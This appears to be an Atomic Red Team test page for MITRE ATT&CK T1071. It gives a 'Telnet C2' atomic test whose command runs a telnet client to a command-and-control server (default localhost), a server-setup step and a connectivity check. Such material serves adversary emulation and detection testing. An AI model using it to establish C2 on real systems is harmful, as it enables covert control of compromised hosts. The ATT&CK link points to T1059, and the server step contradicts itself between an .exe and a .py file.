# T1071 - Application Layer Protocol
## [Description from ATT&CK](https://attack.mitre.org/techniques/T1059/)
<blockquote>Adversaries may communicate using OSI application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.</blockquote>

## Atomic Test #1 - Telnet C2
An adversary may establish telnet communication from compromised endpoint to command and control (C2) server to be able to operate more attack on objectives.

**Supported Platforms:** Windows


**auto_generated_guid:** 3b0df731-030c-4768-b492-2a3216d90e53




#### Inputs:
| Name | Description | Type | Default Value |
|------|-------------|------|---------------|
| server_ip | C2 server IP or URL | url | localhost |
| server_port | C2 server port | number | 23 |
| client_path | Path to telnet agent | path | PathToAtomicsFolder\T1071\src\telnet_client.exe |


#### Attack Commands: Run with `powershell`! 


```cmd
.\#{client_path} #{server_ip} --port #{server_port}
```

#### Dependencies Run with `powershell`!:

##### Description: Command and Control (C2) server cam be established by running PathToAtomicsFolder\T1071\bin\telnet_server.exe on specified server with specified IP that must be reachable by client (telnet_client.exe)

```powershell
.\telnet_server.py server_ip --port port_number
```

##### Check Prereq Commands:
```powershell
$connection = Test-NetConnection -ComputerName #{server_ip} -Port #{server_port}
if ($connection.TcpTestSucceeded) {exit 0} else {exit 1}
```
